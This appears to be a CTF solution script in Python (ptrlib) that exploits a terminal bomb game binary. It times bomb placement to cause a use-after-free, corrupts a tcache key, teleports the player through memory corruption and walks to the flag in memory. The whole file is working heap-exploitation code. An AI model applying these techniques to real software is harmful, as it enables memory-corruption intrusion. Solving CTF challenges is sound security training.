from ptrlib import *

# Retry until good init state
while True:
    sock = Process("../files/game",
                   env={"LINES": "48", "COLUMNS": "48", "TERM": "xterm"})
    sock.recvscreen()

    init_scr = sock.recvscreen(returns=list)
    if init_scr[1][2:6].count('@'):
        logger.warning("Trying again...")
        continue
    break

# Put bomb
logger.info("Use-after-Free...")
sock.sendctrl('RIGHT')
sock.recvscreen()
sock.send(' ') # put
sock.recvscreen()
sock.sendctrl('LEFT')

while sock.recvscreen(returns=list)[1][1] != 'P':
    # Wait until bomb is set
    pass

# Pick up exploding bomb
logger.info("Picking up UAF bomb...")
cnt = 0
while True:
    if sock.recvscreen(returns=list)[1][2] == '*':
        cnt += 1
    if cnt == 4:
        sock.sendctrl('RIGHT') # Avoid explosion
        break

sock.recvscreen()
sock.send(' ') # pick up
sock.recvscreen()
sock.send(' ') # put again to destroy wall

while sock.recvscreen(returns=list)[0][5] != ' ':
    # Wait until wall is gone
    pass

# Move to (5, -2)
logger.info("Corrupting tcache key")
for _ in range(3):
    sock.recvscreen()
    sock.sendctrl('RIGHT')
for _ in range(3):
    sock.recvscreen()
    sock.sendctrl('UP')

# Corrupt tcache key
sock.recvscreen()
sock.send(' ') # put
sock.recvscreen()
sock.send(' ') # pick up

for _ in range(10):
    # Wait a bit
    sock.recvscreen()

# Move to (15, -6) and put bomb
logger.info("Teleporting player...")
for _ in range(4):
    sock.recvscreen()
    sock.sendctrl('UP')
for _ in range(10):
    sock.recvscreen()
    sock.sendctrl('RIGHT')
sock.recvscreen()
sock.send(' ') # put

for _ in range(10):
    # Wait a bit
    sock.recvscreen()

# Move to flag on memory
logger.info("Getting flag...")
for _ in range(48):
    sock.recvscreen()
    sock.sendctrl('DOWN')
for _ in range(15):
    sock.recvscreen()
    sock.sendctrl('RIGHT')

sock.recvscreen()
sock.recvscreen()

print(sock.recvscreen())
sock.close()
